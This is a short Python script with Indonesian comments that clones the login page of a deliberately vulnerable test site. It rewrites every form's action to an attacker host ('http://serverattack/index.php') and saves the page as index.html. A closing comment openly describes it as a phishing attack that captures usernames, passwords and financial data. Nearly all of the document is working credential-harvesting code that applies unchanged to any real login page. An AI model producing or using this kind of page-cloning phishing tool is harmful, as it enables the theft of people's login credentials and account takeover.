from bs4 import BeautifulSoup
import requests

URL = "http://testphp.vulnweb.com/login.php"
respon = requests.get(URL)
# LXML adalah pustaka untuk memproses dokumen HTML dan XML
bs = BeautifulSoup(respon.text, "lxml")
# Mencari kata "form", yaitu formulir yang dapat disalin
formulirs = bs.find_all("form")
# Memulai loop for untuk menjelajahi setiap formulir dalam daftar formulir
for formulir in formulirs:
    # Mengubah konten action ke alamat target yang diinginkan, sehingga ketika
    # pengguna mengakses halaman palsu, mereka akan diarahkan ke index.php yang memiliki skrip
    formulir["action"] = "http://serverattack/index.php"
# Membuka file index.html dan menuliskan konten yang telah diubah dari halaman ke index
with open("index.html", "w") as halaman:
    halaman.write(str(bs))
print("Halaman berhasil disalin")

# ====================================================================================== 
# Kode ini memiliki tujuan untuk melakukan serangan phishing. Secara khusus, kode ini mencoba untuk menyalin halaman login dari URL yang disebutkan (`http://testphp.vulnweb.com/login.php`), kemudian mengganti tindakan (`action`) dari formulir pada halaman tersebut agar mengarah ke situs yang dikendalikan oleh penyerang (`http://serverattack/index.php`). Dengan demikian, ketika pengguna mengakses halaman palsu yang telah dimodifikasi, informasi login yang mereka masukkan akan dikirimkan ke situs yang dikendalikan oleh penyerang, bukan ke situs asli yang sah.

# Ini adalah contoh dari teknik serangan phishing, di mana penyerang mencoba untuk memperoleh informasi sensitif seperti nama pengguna, kata sandi, atau data finansial dengan menyamar sebagai entitas tepercaya.
